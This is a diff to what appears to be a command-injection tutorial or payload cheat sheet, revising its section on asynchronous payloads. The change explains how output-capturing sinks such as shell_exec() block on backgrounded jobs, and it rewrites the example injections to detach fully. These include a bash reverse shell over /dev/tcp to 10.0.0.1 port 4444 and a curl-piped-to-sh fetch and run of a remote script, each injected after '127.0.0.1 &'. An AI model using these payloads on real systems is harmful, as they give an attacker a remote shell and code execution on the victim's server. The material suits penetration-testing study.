@@ -28,12 +28,12 @@ The shell backgrounds the (intended) command and runs `id`; control returns with
 
 ## Asynchronous payloads
 
-Detachment matters most when the payload is slow or should outlive the request. Spawn a reverse shell or a staged download in the background so the HTTP transaction completes normally:
+Detachment matters most when the payload is slow or should outlive the request. One caveat: when the vulnerable sink **captures output** (`shell_exec()`, `subprocess` with captured stdout/stderr, backticks), a backgrounded job still inherits those pipes, so the caller can block until the job exits even though the shell itself has moved on. Redirect all three standard streams (`</dev/null >/dev/null 2>&1`) so the job is fully detached and the response returns immediately:
 
 ```
-127.0.0.1 & bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' &
-127.0.0.1 & (curl http://10.0.0.1/s.sh | sh) &
-127.0.0.1 & nohup sleep 300 &        # survives the parent exiting
+127.0.0.1 & bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' </dev/null >/dev/null 2>&1 &
+127.0.0.1 & (curl http://10.0.0.1/s.sh | sh) </dev/null >/dev/null 2>&1 &
+127.0.0.1 & nohup sleep 300 >/dev/null 2>&1 &        # survives the parent exiting
 ```
 
 Fully detaching from the controlling terminal and streams keeps the job alive after the request ends:
